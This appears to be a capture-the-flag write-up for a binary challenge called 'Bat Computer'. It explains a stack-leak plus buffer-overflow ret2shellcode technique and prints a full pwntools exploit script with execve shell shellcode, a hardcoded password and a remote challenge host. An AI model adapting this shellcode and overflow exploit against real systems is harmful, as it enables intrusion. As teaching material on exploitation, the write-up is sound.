<head> 
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5X8D3297QB"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-5X8D3297QB');
</script>
</head>
<div class="page-header">
    <div class="page-header-inner">
        <div class="page-header-inner2">
            <h1>PWN/Bat Computer - Easy</h1>
            <h2>Augest 2021</h2>
            <h4>Ret2shellcode</h4>
        </div>
    </div>
</div>
<H4>Problem</H4>
<div class="paragraph">
    <p>
    It's your time to save the world!
    <br>
    </p>
</div>
<H4>Solution</H4>
<div class="paragraph">
    <p>
    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
        <br><br>
    	The binary only has 1 function of interest to us. Main executes 2 different code paths depending on if we input '1' or '2'. If we input anything else it returns. Upon inputting '1', the binary gives us a stack leak. When inputting '2' it asks us for a password. If we correctly provide it, the binary reads in even more input leading to a buffer overflow.
    	<br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/bat_computer1.png" alt="">
</div>
<div class="paragraph">
    <p>
        Since the binary does not have NX enabled and we have a stack leak, exploitation becomes trivial. We can just redirect execution to our buffer and execute shellcode to spawn a shell and retrieve the flag. <br><br> The full exploit is posted below. 
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/bat_computer9.png" alt="">
</div>
<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>

<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
<span style="color: #cb4b16">import</span> <span style="color: #268bd2">time</span>
<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./vuln'</span><span style="color: #839496">)</span>
<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>

<span style="color: #839496">local</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">False</span>

<span style="color: #859900">if</span> <span style="color: #839496">local:</span>
    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
<span style="color: #859900">else</span><span style="color: #839496">:</span>
    <span style="color: #839496">host</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">'46.101.23.188'</span>
    <span style="color: #839496">port</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">32061</span>
    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">remote(host,port)</span>

<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recvuntil(</span><span style="color: #2aa198">'him: '</span><span style="color: #839496">)</span>
<span style="color: #839496">ret</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">int</span><span style="color: #839496">(p</span><span style="color: #586e75">.</span><span style="color: #839496">recvline()</span><span style="color: #586e75">.</span><span style="color: #839496">strip(),</span><span style="color: #2aa198">16</span><span style="color: #839496">)</span>
<span style="color: #268bd2">print</span><span style="color: #839496">(</span><span style="color: #268bd2">hex</span><span style="color: #839496">(ret))</span>

<span style="color: #839496">shellcode</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b'\x31\xF6\x31\xD2\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x48\x89\xE7\x6A\x3B\x58\x0F\x05'</span>

<span style="color: #839496">payload</span> <span style="color: #586e75">=</span> <span style="color: #839496">shellcode</span> <span style="color: #586e75">+</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #839496">(</span><span style="color: #2aa198">84</span><span style="color: #586e75">-</span><span style="color: #268bd2">len</span><span style="color: #839496">(shellcode))</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(ret)</span>

<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'2'</span><span style="color: #839496">)</span>
<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">"b4tp@$$w0rd!"</span><span style="color: #839496">)</span>
<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(payload)</span>

<span style="color: #839496">time</span><span style="color: #586e75">.</span><span style="color: #839496">sleep(</span><span style="color: #2aa198">1</span><span style="color: #839496">)</span>
<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'3'</span><span style="color: #839496">)</span>
<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'cat flag.txt'</span><span style="color: #839496">)</span>

<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
</pre></div>
<br><br>
<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>